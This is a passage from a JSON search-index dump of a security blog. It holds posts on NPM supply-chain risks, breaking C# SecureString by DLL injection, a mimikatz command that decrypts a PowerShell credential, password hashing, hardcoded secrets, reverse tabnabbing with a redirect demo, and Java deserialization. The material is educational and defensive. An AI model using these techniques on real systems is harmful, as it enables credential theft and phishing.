a \u0026quot; Browerify angularjs shim\u0026quot;. But you see the possibilities here right? How many people have installed this package by mistake? (I have to say that I installed it once).\nIt\u0026rsquo;s quite easy to make somebody install a different package because of a misused name, of a typo.\nI believe I made my point, moving on. Lets install express which is the \u0026ldquo;standard\u0026rdquo; package for a webserver\n1  npm install --save express@4.16.2   ](images/image-5.png)\nAs you can see from NPM\u0026rsquo;s output, it installed 51 packages. And from my stats I god around 22 000 lines of code. Have in mind that this is not a problem just for NPM, it is for all package manager all across (specially) the open source community.\nThe .lock file and the package versions I forced NPM to install a specific version, and by the time of this writing the actual version was 4.17.1. Let\u0026rsquo;s tell in the package json that it can install from 4.16.2 and newer version:\n1 2 3  \u0026#34;dependencies\u0026#34;: { \u0026#34;express\u0026#34;: \u0026#34;^4.16.2\u0026#34; }   And then\n1  npm install   \nDid you notice what changed? Nothing. This is because of the package.json.lock file. This file tells the exact versions of the packages used by developers so you can install the same ones. Well this has its up and down sides.\nSo I installed the latest express version and did a pull request to github. These are the changes:\nchanged package json pull request](images/image-7.png)\nCan you see a problem here? No because it\u0026rsquo;s hidden. Github by default hides the changes in package.json.lock because its a generated file and assumes its ok. It is not.\nAs we just saw, NPM uses the lock file to get the exact versions to install. A malicious user can create a pull request just like I did, but in the lock change a version of the dependency to a vulnerable one.\nYou can create a package that seems to be a legitime package with some nice functionalities but that has a dependency of another package which has some kind of vulnerability. Most of the times if dependencies are checked, only the direct dependencies are reviewed.\n\u0026ldquo;Stealing\u0026rdquo; a package Another problem is if an attacker manages to get control of a legitimate package which has already some reputation. This can happen due to some different reasons:\n The owner doesn\u0026rsquo;t want to maintain the package anymore - This is something common, but sometimes the owner \u0026ldquo;gives\u0026rdquo; the package to a dev that seems willing to keep the work The keys to NPM are commited to the source code - And this one here is one of the most serious and common problems, specially when you have some CI/CD. Nowadays you can configure your pipelines to publish the packages through config files, that usually go into the source code repo. By mistake developers commit the keys in there, and even when they are removed, they are still in source control. An attacker can get access to one and release a new version.  Check out my post about hardcoded credentials for more info.\nNPM And Source Control Another issue is that you can do a version bump to your package, commit it to lets say, github, and there you\u0026rsquo;ll see a tag with the new version, and then, do some more changes in the code locally and build/publish it to NPM. What this means is that you can bump a new version push the source code and then, with new commits, change that \u0026ldquo;version\u0026rdquo; code adding malicious code and send it to NPM. This is a common attack technique being widely used.\nIf you want to review the source code of a package never do it on the official repo, install it first on a machine (without the NPM hooks) and check the source in the NPM package.\nSecurity Measures To wrap up everything that was talked in this post, these are the security precautions you should have when working with NPM packages:\n Avoid using unnecessary packages - You\u0026rsquo;re increasing the likelihood of installing malicious or vulnerable code Install well known packages - Although this is not a guarantee, big projects tend to have more people looking at them, as well as a tight security Do not ignore the security issues - NPM has an audit features that tells you about known issues in the package versions you are using Use a SCA service - SCA stands for Software Composition Analysis, and also checks for known vulnerabilities in the packages you use. I personally like to use Snyk. You can use it for free, its really good and they also have nice articles. Ignore Script Hooks - If a package has an install script hook like we saw in the begining of this article, just by installing the package you may be in danger, so install packages without running its scripts: npm install \u0026ndash;ignore-scripts \u0026lt;package_name\u0026gt;  ", 
        "url": "https:\/\/thesecurityvault.com\/security-of-the-npm-packages\/",
        "summary": "Javascript (and typescript) is now one of the most used languages in new projects. It has an awesome performance, and Promises came to improve it even more. With it came tons of new tools and projects like Node and NPM. But not all is good, the security of the NPM packages is a worrying problem. …",
        "preview": "https:\/\/thesecurityvault.com\/security-of-the-npm-packages\//images\/banner.png"
    },
    
    
    
    "https:\/\/thesecurityvault.com\/breaking_c_sharp_securestring\/": {
        
        "title": "Breaking C# SecureString",
        "tags": [],
        "content": "As discussed previously in Heap Inspection post keeping passwords and other sensitive data in memory may be insecure as they can be inspected or dumped.\nAlthough it is almost impossible to completely mitigate Heap Inspection there are several techniques to reduce the time frame sensitive data keeps in memory, lowering the risk of exposure.\nLets review some of them:\n Don\u0026rsquo;t store sensitive data as strings, Use char arrays, and override their values when not needed anymore Keep the data as less time as possible in memory keep data encrypted if needed Use as few instances of the data as possible  But besides these tricks there are also some constraints that will prevent you from doing it right:\n Most of libraries/frameworks are not prepared for this topic so they (only) use string parameters Webservers usually parse request data as strings so if you receive a password from an http request you are already done. Working with char arrays its much more complex and introduces a big development overhead  At the end you will probably end up having a string somewhere.\nTo try to help with this Microsoft introduced in .NET a feature called SecureString.\nWhat is SecureString? SecureString is a class that provides ways to keep sensitive information encrypted in memory in an easy way.\nLet\u0026rsquo;s see how to use it:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  SecureString ss = new SecureString(); ss.AppendChar(\u0026#39;T\u0026#39;); ss.AppendChar(\u0026#39;h\u0026#39;); ss.AppendChar(\u0026#39;e\u0026#39;); ss.AppendChar(\u0026#39;S\u0026#39;); ss.AppendChar(\u0026#39;e\u0026#39;); ss.AppendChar(\u0026#39;c\u0026#39;); ss.AppendChar(\u0026#39;u\u0026#39;); ss.AppendChar(\u0026#39;r\u0026#39;); ss.AppendChar(\u0026#39;i\u0026#39;); ss.AppendChar(\u0026#39;t\u0026#39;); ss.AppendChar(\u0026#39;y\u0026#39;); ss.AppendChar(\u0026#39;V\u0026#39;); ss.AppendChar(\u0026#39;a\u0026#39;); ss.AppendChar(\u0026#39;u\u0026#39;); ss.AppendChar(\u0026#39;l\u0026#39;); ss.AppendChar(\u0026#39;t\u0026#39;); ss.MakeReadOnly();   How does it work This is the part that got me curious. If data is encrypted it needs to use a key to encrypt it, so where is the key saved? Can we get it? Can we find a way to decrypt the data?\nHere I started digging into Microsoft documentation about SecureString, looking at the source code, and so on, and I found some nice information.\nThese are the main features of SecureString that are important to highlight:\nProperly disposes data\nWhen data is not needed anymore SecureString clears the memory used, by zeroing it.\nKeeps data in unmanaged memory\nThis means that data in not kept in memory space managed by dotnet, which is good since GarbageCollector doesn\u0026rsquo;t get to it.\nSecureString only works in Windows\nIt uses windows Crypto API so the encryption functionalities cannot be ported to other Operating Systems.\nEncryption is done by calling RtlEncryptMemory (in the classe\u0026rsquo;s source code you find it in a call to Win32Native.SystemFunction041) from Advapi32.h\nThis is actually nice because you don\u0026rsquo;t need to supply a password to it. Windows handles that for you. Otherwise you would need to worry with the encryption password in memory\u0026hellip;\nSo the question now is what/who can decrypt it?\nOne of the parameters of the function call to encrypt the data specifies which processes can decrypt the encrypted data. This parameter has 3 options that mean:\n Any process can decrypt it Any process from the same user can decrypt it Only the same process can decrypt it  SecureString sets this parameter so that only the current process can decrypt it. This is nice.\nHow to \u0026ldquo;break\u0026rdquo; it Now that we have a good knowledge of how it works we can try to \u0026ldquo;break\u0026rdquo; it.\nSince the encrypted data can only be decrypted by the process that encrypted it (at the end we will see this is not 100% true) we need to trick the application to decrypt the SecureString for us.\nLets see a simple application using a SecureString object, that we want to revert:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  using System; using System.Security; namespace BreakingSecureString { class Program { static void Main(string\\[\\] args) { SecureString ss = new SecureString(); ss.AppendChar(\u0026#39;T\u0026#39;); ss.AppendChar(\u0026#39;h\u0026#39;); ss.AppendChar(\u0026#39;e\u0026#39;); ss.AppendChar(\u0026#39;S\u0026#39;); ss.AppendChar(\u0026#39;e\u0026#39;); ss.AppendChar(\u0026#39;c\u0026#39;); ss.AppendChar(\u0026#39;u\u0026#39;); ss.AppendChar(\u0026#39;r\u0026#39;); ss.AppendChar(\u0026#39;i\u0026#39;); ss.AppendChar(\u0026#39;t\u0026#39;); ss.AppendChar(\u0026#39;y\u0026#39;); ss.AppendChar(\u0026#39;V\u0026#39;); ss.AppendChar(\u0026#39;a\u0026#39;); ss.AppendChar(\u0026#39;u\u0026#39;); ss.AppendChar(\u0026#39;l\u0026#39;); ss.AppendChar(\u0026#39;t\u0026#39;); ss.MakeReadOnly(); Console.WriteLine(\u0026#34;Generated SecureString object\u0026#34;); Console.WriteLine(\u0026#34;Press any key to exit...\u0026#34;); Console.ReadKey(); } } }   As you can see, this is a really simple application that doesn\u0026rsquo;t even have a method to get the cleartext password. So how can we do it?\nWell, one way is to inject code into the target application. We can do this with multiple code injection techniques. For this case I chose DLL Injection.\n\n(Image taken from here)\nGoing into the details of how DLL Injection works is out of the scope of this post, but the source of the project that accomplishes this is at the end of the article, feel free to dig into it.\nSo the idea is to inject a DLL that has the necessary code to decrypt the SecureString instances. Sounds good but how can we get the reference for the variables, since we just injected new code?\nWell, first thing that comes into mind is by using Reflection. Unfortunately you can\u0026rsquo;t use it to get instances of a class.\nSo I came up with the idea of using the same techniques as a debugger. And Microsoft has a library called \u0026ldquo;CLR MD\u0026rdquo; for exactly that.\nWe can use this library to get the pointer address of the SecureStrings of the target application.\nThen when invoking the DLL injected method we can send these pointers as parameters, get the object there and ask to decrypt the content.\n\n.\nExplaining the code Since there\u0026rsquo;re a few files of code to make this work, I will not put the code in the post content , but you can find a reference for the source code at the end of the article.\nThere are 3 projects in the Solution:\n VulnerableApp - This is the target app, that we want to trick into decrypting the SecureStrings for us MaliciousApp - Name also speaks for itself. It injects the malicious DLL, uses the CLR MD to get the SecureString pointers, and invokes a method from the malicious DLL sending the pointers as parameters DLLToInject - The malicious DLL that will be injected into the VulnerableApp  Important notes about the code:\nYour antivirus may catch this project as malicious, since DLL Injection is commonly used for bad purposes. Or it may only block it from running after a few times. (If you\u0026rsquo;re interested in how AV\u0026rsquo;s work, check my post post here).\nFor you to inject into another process there are two important things to have in mind:\n Target process needs to be in the same architecture as malicious app and DLL (x64 or x86). You need to have full control of the process, if you don\u0026rsquo;t have enough permissions it will not work. Administrator account should work for most of the cases.  Is SecureString recommended? This is the question that really matters. If it\u0026rsquo;s that easy to bypass its security should SecureString be used at all?\nMicrosoft has the following statement in their docs:\n We don\u0026rsquo;t recommend that you use the SecureString class for new development. For more information, see SecureString shouldn\u0026rsquo;t be used on GitHub.\nMicrosoft Docs\n There are a few reasons for this. The API\u0026rsquo;s that SecureString uses underneath are Windows specific, which mean that now with .NET Core if you are using SecureString in another OS they won\u0026rsquo;t be encrypted.\nAnd as we saw, the name can be misleading. SecureString is to be used as an extra security mecanism, where you don\u0026rsquo;t store sensitive data in Strings, making it much easier to clean from memory, and thus, shortening the time for exploitation.\nThe encryption is only a precaution so that if, for example, an application crashes and windows generates a memory dump, the content of password and other sensitive data is not written in plaintext to the logs.\nI believe that this note from Microsoft is due to the limitations that SecureString has in .NET Core. I see no problem using it as an extra security layer, as long as is not used to provide the needed security.\nOther attack vectors There are already a few attack vectors for Windows Crypto API. For example NSA just recently disclosed a 0-Day related with certificates.\nI just wanted to create a different attack vector, specific for SecureStrings, so I came out with the technique described in the article..\nMimikatz, which is an awesome tool, can decrypt Powershell PSCredential (which contains a SecureString) by getting the original password used to encrypt the data. Lets see a quick example on how to do it.\nFirst we need the Powershell SecureString object.\n1  Get-Credential |Export-CliXML -path \u0026#39;securestring.xml\u0026#39;   Now, after downloading mimikatz from here and running, type the following command:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  dpapi::ps /in:PATH\\_TO\\_YOUR\\\\securestring.xml /unprotect And here you have the output: UserName: TheSecurityVault Password: \\*\\*BLOB\\*\\* dwVersion : 00000001 - 1 guidProvider : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb} dwMasterKeyVersion : 00000001 - 1 guidMasterKey : {49bf61cf-7898-45a4-92a0-012cb70d1fe2} dwFlags : 00000000 - 0 () dwDescriptionLen : 00000002 - 2 szDescription : algCrypt : 00006603 - 26115 (CALG\\_3DES) dwAlgCryptLen : 000000c0 - 192 dwSaltLen : 00000010 - 16 pbSalt : b70f39c018e17acda8c2a15fd0ef3c56 dwHmacKeyLen : 00000000 - 0 pbHmackKey : algHash : 00008004 - 32772 (CALG\\_SHA1) dwAlgHashLen : 000000a0 - 160 dwHmac2KeyLen : 00000010 - 16 pbHmack2Key : 93d06c092b3bb6e3c71506f53511a28f dwDataLen : 00000028 - 40 pbData : e7039975bd1af687ed8e266172c1f99480e443e4921dc20e45be396a6e608c05aafcf2ee210875f5 dwSignLen : 00000014 - 20 pbSign : 5e6ab77d1c5ffa22946b122998264dd4796ea6a9 \\* using CryptUnprotectData API \u0026gt;\u0026gt; cleartext: InsecurePassword   Since it\u0026rsquo;s not directly using the same API\u0026rsquo;s from Windows as SecureString it is not limited to the same process restriction.\nAs mimikatz did this for PSCredential, the same techniques can be used for C# SecureStrings (although not supported)\nThe source code for this project can be found on github.\n", 
        "url": "https:\/\/thesecurityvault.com\/breaking_c_sharp_securestring\/",
        "summary": "As discussed previously in Heap Inspection post keeping passwords and other sensitive data in memory may be insecure as they can be inspected or dumped.\nAlthough it is almost impossible to completely mitigate Heap Inspection there are several techniques to reduce the time frame sensitive data keeps …",
        "preview": "https:\/\/thesecurityvault.com\/breaking_c_sharp_securestring\//\/..\/images\/banner.jpeg"
    },
    
    
    
    "https:\/\/thesecurityvault.com\/secure-password-hashing\/": {
        
        "title": "Secure Password Hashing",
        "tags": [],
        "content": "Password Hashing 101: MD5 and SHA1 which are quite common, are already considered unsafe. So if you are using them, replace them with a secure algorithm. Even for checksums should not considered secure. Check references for more info.\nNow that we put that aside lets start from the basics.\nUser passwords should always be stored in a one way hash.\nThis means that after hashing it the original content cannot be retrieved.\nTo attack it there are the so called brute force attacks that can try all possible combinations until it gives the same hash. This is usually avoided since it may be quite slow.\nA better way to attack this is to use Rainbow Tables.\nA Rainbow Table is a pre-computed table that stores the hash values for a specific range and length of characters. This way instead of being hashing all possible combinations, you just need to find the already hashed value, and see the value that generated that hash. This is a lot faster and reliable, if you already have the rainbow table.\nAnd to prevent this type of attacks a salt is used.\nSalt If you search for salt in cryptography on google you will see everywhere saying that salt adds entropy to the password/hash. But what does that mean?\nIt means that adding a salt (which is a set of bytes) to a password its hash will be different. If you want to use the regular pre-computed rainbow tables you won\u0026rsquo;t be able to find the password to login on a system for two reasons:\n You \u0026ldquo;cannot\u0026rdquo; find a collision (a collision is when two different inputs give the same hash). If a collision is found in an hashing algorithm it gets considered unsafe. So while you use a considered safe algorithm that shouldn\u0026rsquo;t apply Even if you eventually find a collision and set the obtained password on a website to try to login, the webserver will apply a salt to that password and the ending hash will be different.  So you can generate a rainbow table for a specific salt and use it to break a dump of passwords. Well\u0026hellip; Salts need be unique, in other words, you should have a different salt for each user. This would make unreliable generating RainbowTables for multiple users.\nIf you are generating a new salt for each user you need to save it anywhere. Usually salts are stored in plaintext in the database, thats ok.\nRegarding salt there are some discussions about its properties. I\u0026rsquo;m going to write about my opinions and explain why :)\n Salt needs to be unique - This is the most important. Each user password should have an uniquely generated salt for it. Using same salt for multiple users would decrease the effort to crack them. Salt can be public - Yes, it doesn\u0026rsquo;t matter if an attacker knows your salt\u0026hellip; He can\u0026rsquo;t do much with it. He can generate a rainbow table before he gets the hash dump. But, can only try to crack the hash if has access to the DB to get the hash, and if he gets to the DB to get the hash it also gets the salt. Its just a matter of starting a rainbow table sooner. But there is no reason for a salt to be public anyway. Salt doesn\u0026rsquo;t need to be securely generated - If you look in the web, you will see a lot of articles stating that salt needs to be securely generated. I disagree, first because of the previous point, it can be public. If you just use Random which is predictable, an attacker can guest the next salt values and if it has enough samples (which means had to see previous salts in database) it could predict the next ones. So to correctly predict them it would need to know how much times the Random method had run before. Lets assume that random is only used to generate salts, the attacker would need to know how many users where created since then (could be possible through user ID\u0026rsquo;s) and if salt has changed (when a user changes password), to guess next salts. That\u0026rsquo;s a lot of pre-conditions to be feasible.\nIf you want to use SecureRandom there\u0026rsquo;s no harm in doing it. If you have a system with high performance requirements, Random is enough to have good security as well Salt should be long enough - The recommended length is at least 128 bits. When user changes password a new salt should also be generated.  Pepper Pepper is another layer of security and it acts quite like the salt. The difference is that it\u0026rsquo;s the same for all users, and shouldn\u0026rsquo;t be stored on database. Hardcoding it or putting on a config file its ok.\nThe motivation to do so is that if an attacker gets to dump the database (with an sql injection for example) it still needs the pepper to be able to brute force the credentials.\nHash Algorithms Ok, so we already understand salts, what about the right algorithm for hashing?\nYou cannot tell the \u0026ldquo;best\u0026rdquo; one. There are different scenarios, ones better than others.\nLets take a quick look\u0026hellip;\nI like to separate the sha* algorithms and\u0026hellip; the others :)\nFor some time sha256 and sha512 have been suggested instead of for example sha1 or md5. The issue with sha256 and 512 is that they are really fast to process. A challenge on twitter showed that a 10 char sha256 hash was broken by individuals in 5 days\nThat\u0026rsquo;s why I usually turn to other solutions like Argon2, Bcrypt or PBKDF2\nThese algorithms take more resources from the machine and are slower to compute. While this can be a disadvantage since it consumes more server resources, they increase significantly the password security.\nIETF published in 2017 RFC8018 where PBKDF2 it the recommended algorithm for password derivation (which can be used for password hashing). On the other hand, OWASP recomends the usage of Argon2, Bcrypt is also a good alternative.\nThere\u0026rsquo;s an awesome article from 1password about how they use PBKDF2\nActually Argon2 is growing on me and it won the password hashing competition\nJust out of curiosity I\u0026rsquo;ve seen projects where HMAC was used for password hashing but I don\u0026rsquo;t recommend it\nIterations Some hash algorithms allow you the define the iterations count. This defines how many times the algorithm is going to be used. It increases the security of your application by making harder to compute the final hash.\nThe amount of recommended iterations can change according to each algorithm. For example, NIST recommends 10 000 iterations for PBKDF2.\nArgon2 not only uses the iterations to affect the computational cost, but you can define the memory to be used and the number of threads. So each system should define this values according to its hardware requirements, and this has impact in the final hash .\n", 
        "url": "https:\/\/thesecurityvault.com\/secure-password-hashing\/",
        "summary": "Password Hashing 101: MD5 and SHA1 which are quite common, are already considered unsafe. So if you are using them, replace them with a secure algorithm. Even for checksums should not considered secure. Check references for more info.\nNow that we put that aside lets start from the basics.\nUser …",
        "preview": "https:\/\/thesecurityvault.com\/secure-password-hashing\//images\/banner.jpeg"
    },
    
    
    
    "https:\/\/thesecurityvault.com\/hardcoded-passwords\/": {
        
        "title": "Hardcoded Passwords",
        "tags": [],
        "content": "Hardcoded passwords\u0026hellip; This is a problem quite common, and most of the projects that I get my hands on have a hardcoded password somewhere.\nBut, what\u0026rsquo;s the problem of having for example the password of the database in the code?\nWell, actually, a lot!\nLets start by the most straightforward scenario. Hardcoded passwords, (and when I say passwords I mean credentials, not just passwords) get into source control. From there its impossible to remove. If you share source control between all the developers, if you open source the project, everybody with access to it can see those credentials, and depending on the scenarios use them to login on a service. If you are concerned with Heap Inspection its also bad.\nAs you can imagine there are tons of tools to search, for example, in github to find passwords commited in the code. A simple google search can give a good list:\n https://github.com/zricethezav/gitleaks https://github.com/dxa4481/truffleHog https://github.com/kootenpv/gittyleaks  And you can even use github dorks to find passwords: github-dorks\nBut you can use these techniques to help you preventing commits with passwords as well :)\nHonestly I never tried this tools, but don\u0026rsquo;t need to use them to know that you will find a lot of results. I see this problem on almost all projects I review.\nThe deployed version of the software will also have the keys hardcoded. Its not as bad if its a web application deployed on your server, for example. But if this is a desktop application the user can eventually get a hold on the password.\nBut there are much more scenarios why you should not hardcode passwords. Let\u0026rsquo;s assume an attacker finds path traversal in your website. With some luck it can find a file that has hardcoded credentials, and again, depending on the scenario he could even login with those credentials on the service.\nRetrieving an hardcoded password from a binary Theory aside lets see some examples on how this can be \u0026ldquo;exploited\u0026rdquo; and prevented.\nTake a look at this super complex C code that just has an hardcoded password:\n1 2 3 4 5 6  #include \u0026lt;stdio.h\u0026gt;int main() { char *pwd = \u0026#34;super_password_not_that_secure\u0026#34;; return 0; }   Lets compile it:\n1  gcc password.c -o pwd_program   And now have a binary file, user can\u0026rsquo;t see the password right?\nWrong.\nIt\u0026rsquo;s quite easy to retrieve for example strings from a binary. In linux you can do this with the strings command (there\u0026rsquo;s an equivalent for windows from sysinternals:\n1  strings pwd_program   You will get a list of strings, and the password will be there.\nIn a java .jar file it\u0026rsquo;s even worse. Here you need to \u0026ldquo;guess\u0026rdquo; that a specific string is a password. Or dig much further to understand what the passwords are.\nIn Java doing an easy reverse engineering you get almost the original source code. Variable names and all. This makes much easier to figure out where passwords are.\nSo I created this simple peace of code and built the jar file for it:\n1 2 3 4 5 6 7 8 9  package com.securitywhitepapers.hardcodedpassword; public class NewMain { public static void main(String[] args) { String password = \u0026#34;somehiddenpassword\u0026#34;; } }   Now we can use a tool called jd-gui to easly reverse engineer the .jar file. You just need to drag it over:\n\nAnd there\u0026rsquo;s the password.\nSo if you plan to send a binary file to an user, with an hardcoded password you are doing it wrong.\nAvoiding Hardcoded Passwords Now that we understand this lets see how on a server side app we can store and use passwords\nOn a Desktop Application If you think you need to store some password that is not from the user, you are doing something wrong\u0026hellip; If you have for example a Facebook app and you need to have the app id, you should not hardcoded it. You have a webservice that does that part. The desktop/client-side app communicates with your service and the webservice calls facebook app.\nThis is how you should proceed for almost scenarios.\nOn a backend application To manage passwords on the backend there are some different techniques you can use, some more secure then others.\nFeeding passwords to the application through the command line args This is nice, since the password isn\u0026rsquo;t stored anywhere, you depend on a user to type the passwords as an argument when starting the application, this can be bad, if the server reboots by any reasons. You would need to manually start the application\nSaving passwords in environment variables If you have a \u0026ldquo;secured\u0026rdquo; machine with restricted access you can just save passwords in environment variables. Although, people with access to the machine can see them. This is not that secure, but still better then hardcoded passwords.\nIf you want to add extra security, you can save them encrypted, and use command line arguments to get the decryption key. You will still have the same problem as the solution above where you need to manually start the app.\nSaving passwords in config/properties files You you create a config/properties file that is not going to source control. The file needs to be stored in a secure location outside the app source code, and restricted access only to the application that needs it. But storing passwords in plain text in config files is not a perfect solution for the same reasons as storing in environment variables\nSecret Managers Secret manager tools allow you to securely save keys in encrypted files, but you may still need at least a master password, or authentication to open the keystore, so again, where do you save that password?\nIf you use a store service like AWS secrets manager, then you don\u0026rsquo;t need to worry with the password that encrypts all the secrets, you shift that responsibility to Amazon (in this case). This is the kind of approach I like the most, and what i\u0026rsquo;m using in a few projects hosted on AWS.\nIf you start combining these methods, you can also end up with a more robust solution. You can use a keystore to store the passwords needed by the application and store it on a safe place,then use a config file, or an environment variable to store the master key to the keystore. Again, its not perfect but its an extra layer of security\nIf you don\u0026rsquo;t mind to write a solution for a specific OS, you can integrate with native tools such as Gnome Keyring or OSX keychain. Windows only has a built in certificate manager, you can\u0026rsquo;t store passwords.\nAlso, don\u0026rsquo;t forget about heap inspection when dealing with passwords in memory\n", 
        "url": "https:\/\/thesecurityvault.com\/hardcoded-passwords\/",
        "summary": "Hardcoded passwords\u0026hellip; This is a problem quite common, and most of the projects that I get my hands on have a hardcoded password somewhere.\nBut, what\u0026rsquo;s the problem of having for example the password of the database in the code?\nWell, actually, a lot!\nLets start by the most straightforward …",
        "preview": "https:\/\/thesecurityvault.com\/hardcoded-passwords\//images\/banner.jpeg"
    },
    
    
    
    "https:\/\/thesecurityvault.com\/reverse-tabnabbing\/": {
        
        "title": "Reverse Tabnabbing",
        "tags": [],
        "content": "Reverse Tabnabbing or also known as Unsafe Target Blank is one of the most underrated vulnerability, and this is the one I like the most. It\u0026rsquo;s really easy to find an exploitable web application and it\u0026rsquo;s also quite easy to mitigate.\nSo what is Reverse Tabnabbing? When you create a link that opens in a new tab (with target='_blank') the browsers injects two variables into the destination page, window.opener and window.referrer.\nwindow.referrer just stores the website that opened the page.\nwindow.opener has a reference to the page that opened the new one.\nNowadays browsers prevent the access to most of the properties of this variable, since it posed many security risks, but there are still some properties that you can access/change, being the most important window.opener.location.\nNote that you cannot read window.opener.location, but you can change its value. If you need to get the url from where the user came from you can use document.referrer\nLets work with the following code which contains a unsafe target blank implementation:\n1 2 3 4 5 6 7 8 9 10  \u0026lt;!DOCTYPE HTML\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;TheSecurityVault - Reverse Tabnabbing\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;TheSecurityVault\u0026lt;/h1\u0026gt; \u0026lt;a href=\u0026#34;reverse_tabnabbing_malicious.html\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;Click me\u0026lt;/a\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   You can find the code and try it here\nNow if a victim opens this link, the \u0026lsquo;malicious\u0026rsquo; page can see where the user came from and even redirect him\nThis is the malicious code:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  \u0026lt;!DOCTYPE HTML\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Hello World! Site Title\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;TheSecurityVault!\u0026lt;/h1\u0026gt; \u0026lt;script\u0026gt; console.log(document.referrer); //this doesn\u0026#39;t work without a webserver  window.opener.location = \u0026#34;https://google.com\u0026#34;; \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   If you test the above example and open the link, you will see that your previous tab gets redirected to google.\nWhat can an attacker do? A malicious page can first, get the page where you came from, lets say facebook. Then it redirects your other tab to a facebook phishing page. Just exactly like facebook, but you are not logged in. Maybe you could find it weird, and try to understand what is the problem, why you were logged out, but most of the users would just ignore it, as they ignore invalid SSL warnings, and try to log in. At this point an attackers gets the credentials you typed in, and game over.\nAnother thing that can be done, is for websites to monitor from which page you came from, and build a profile for you, the sites you visit, and consequently your interests. This is awesome for targeted advertising for example.\nHow to Protect it The protection is quite easy. You just need to add to your link the rel attribute like so:\n1 2 3 4 5 6 7 8 9 10  \u0026lt;!DOCTYPE HTML\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;TheSecurityVault - Reverse Tabnabbing\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;TheSecurityVault\u0026lt;/h1\u0026gt; \u0026lt;a href=\u0026#34;reverse_tabnabbing_malicious.html\u0026#34; target=\u0026#34;_blank\u0026#34; rel=\u0026#34;noopener noreferrer\u0026#34;\u0026gt;Click me\u0026lt;/a\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   This will ensure the new page will not have the window.opener nor window.referrer properties.\nYou can test the prevention here\nFor javascript In javascript this is a little bit more tricky. I couldn\u0026rsquo;t clear the referrer so I did some googling\u0026hellip; Most of the sites ignore the referrer and the few I found mentioning it, their solutions didn\u0026rsquo;t work either :(\nSo what I recommend, if you really need to use javascript, generate a new link and add it to the DOM, you can do this by injecting a hidden link with the rel attribute, trigger a click, and finally remove it from the page like so:\n1 2 3 4 5 6 7 8 9 10 11  var a = document.createElement(\u0026#34;a\u0026#34;); a.style.display = \u0026#34;none\u0026#34;; a.setAttribute(\u0026#34;href\u0026#34;, \u0026#34;reverse_tabnabbing_malicious.html\u0026#34;); a.setAttribute(\u0026#34;rel\u0026#34;, \u0026#34;noopener noreferrer\u0026#34;); a.setAttribute(\u0026#34;target\u0026#34;, \u0026#34;_blank\u0026#34;); document.body.appendChild(a); a.click(); a.remove()   ", 
        "url": "https:\/\/thesecurityvault.com\/reverse-tabnabbing\/",
        "summary": "Reverse Tabnabbing or also known as Unsafe Target Blank is one of the most underrated vulnerability, and this is the one I like the most. It\u0026rsquo;s really easy to find an exploitable web application and it\u0026rsquo;s also quite easy to mitigate.\nSo what is Reverse Tabnabbing? When you create a link …",
        "preview": "https:\/\/thesecurityvault.com\/reverse-tabnabbing\//images\/banner.jpeg"
    },
    
    
    
    "https:\/\/thesecurityvault.com\/insecure-deserialization-in-java\/": {
        
        "title": "Insecure Deserialization in Java",
        "tags": [],
        "content": "Insecure deserialization got in OWASP top 10 in 2017 as most of web applications written in Java and .net where found vulnerable and in most of the scenarios the vulnerabilities got to Remote Code Execution (RCE)\nSo lets see how this vulnerability works, how to exploit it and how to prevent it.\nDeserialization in Java and the Read Object 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74  package org.securitywhitepapers.deserialization; import java.io.FileInputStream; import java.io.FileNotFoundException; import java.io.FileOutputStream; import java.io.IOException; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.util.logging.Level; import java.util.logging.Logger; import ysoserial.payloads.ObjectPayload; public class Main { private static String serializedFile = \u0026#34;serialized.bin\u0026#34;; public static void main(String[] args) { try { //serialize an user object  User u = new User(\u0026#34;Whitepapers\u0026#34;); serialize(u); //and this triggers the vulnerability  u = (User)deserialize(serializedFile); } catch (Exception ex) { Logger.getLogger(Main.class.getName()).log(Level.SEVERE, null, ex); } } private static Object deserialize(Object o) { FileInputStream fileIn = null; ObjectInputStream in = null; try { fileIn = new FileInputStream(serializedFile); in = new ObjectInputStream(fileIn); return in.readObject(); } catch (FileNotFoundException ex) { Logger.getLogger(Main.class.getName()).log(Level.SEVERE, null, ex); } catch (IOException | ClassNotFoundException ex) { Logger.getLogger(Main.class.getName()).log(Level.SEVERE, null, ex); } finally { try { fileIn.close(); in.close(); } catch (IOException ex) { Logger.getLogger(Main.class.getName()).log(Level.SEVERE, null, ex); } } return null; } private static void serialize(Object o) { try { FileOutputStream fileOut = new FileOutputStream(serializedFile); ObjectOutputStream out = new ObjectOutputStream(fileOut); out.writeObject(o); out.close(); fileOut.close(); } catch (IOException ex){ Logger.getLogger(Main.class.getName()).log(Level.SEVERE, null, ex); } } }   In this small example we are creating an object of type User, serialize it and deserialize it.\nAnd this is an exploitable implementation.\nIn java when you implement a Serializable class, Java looks for a method called readObject in it, and if it exists the method will be called (have in mind that a constructor is not called in a deserialization)\nLets see this in action:\nThis is the code of the User class\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 